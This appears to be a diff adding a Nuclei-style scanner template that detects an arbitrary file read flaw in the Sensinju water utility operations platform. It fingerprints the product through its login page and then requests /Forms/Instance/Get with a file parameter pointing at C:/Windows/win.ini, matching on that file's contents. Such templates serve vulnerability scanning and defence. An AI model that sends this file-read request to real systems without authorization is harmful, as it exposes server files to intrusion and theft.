@@ -1,0 +1,49 @@
+id: poc-yaml-sntsoft-wseiop-instance-anyfile-read
+info:
+  name: 森鑫炬水务企业综合运营平台 Instance 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    森鑫炬水务企业综合运营平台存在任意文件读取漏洞，攻击者可利用该漏洞读取服务器上的任意文件。
+
+http:
+  - raw:
+      - |
+        GET /Account/LogOn?ReturnUrl=%2f HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "重庆森鑫炬科技有限公司"
+
+  - raw:
+      - |
+        GET /Forms/Instance/Get?file=C:/Windows/win.ini HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "[files]"
+          - "bit app support"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
+      - type: word
+        part: header
+        words:
+          - "text/xml"
